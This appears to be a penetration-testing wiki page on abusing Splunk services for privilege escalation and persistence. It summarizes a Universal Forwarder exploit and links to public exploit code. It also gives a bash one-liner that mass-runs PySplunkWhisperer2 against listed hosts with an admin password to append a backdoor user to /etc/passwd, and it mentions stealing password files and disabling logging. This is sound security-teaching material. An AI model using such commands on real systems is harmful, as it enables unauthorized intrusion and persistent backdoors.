# Splunk LPE and Persistence

{{#include ../../banners/hacktricks-training.md}}

If **enumerating** a machine **internally** or **externally** you find **Splunk running** (port 8090), if you luckily know any **valid credentials** you can **abuse the Splunk service** to **execute a shell** as the user running Splunk. If root is running it, you can escalate privileges to root.

Also if you are **already root and the Splunk service is not listening only on localhost**, you can **steal** the **password** file **from** the Splunk service and **crack** the passwords, or **add new** credentials to it. And maintain persistence on the host.

In the first image below you can see how a Splunkd web page looks like.

## Splunk Universal Forwarder Agent Exploit Summary

For further details check the post [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). This is just a sumary:

**Exploit Overview:**
An exploit targeting the Splunk Universal Forwarder Agent (UF) allows attackers with the agent password to execute arbitrary code on systems running the agent, potentially compromising an entire network.

**Key Points:**

- The UF agent does not validate incoming connections or the authenticity of code, making it vulnerable to unauthorized code execution.
- Common password acquisition methods include locating them in network directories, file shares, or internal documentation.
- Successful exploitation can lead to SYSTEM or root level access on compromised hosts, data exfiltration, and further network infiltration.

**Exploit Execution:**

1. Attacker obtains the UF agent password.
2. Utilizes the Splunk API to send commands or scripts to the agents.
3. Possible actions include file extraction, user account manipulation, and system compromise.

**Impact:**

- Full network compromise with SYSTEM/root level permissions on each host.
- Potential for disabling logging to evade detection.
- Installation of backdoors or ransomware.

**Example Command for Exploitation:**

```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```

**Usable public exploits:**

- https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
- https://www.exploit-db.com/exploits/46238
- https://www.exploit-db.com/exploits/46487

## Abusing Splunk Queries

**For further details check the post [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)**

{{#include ../../banners/hacktricks-training.md}}



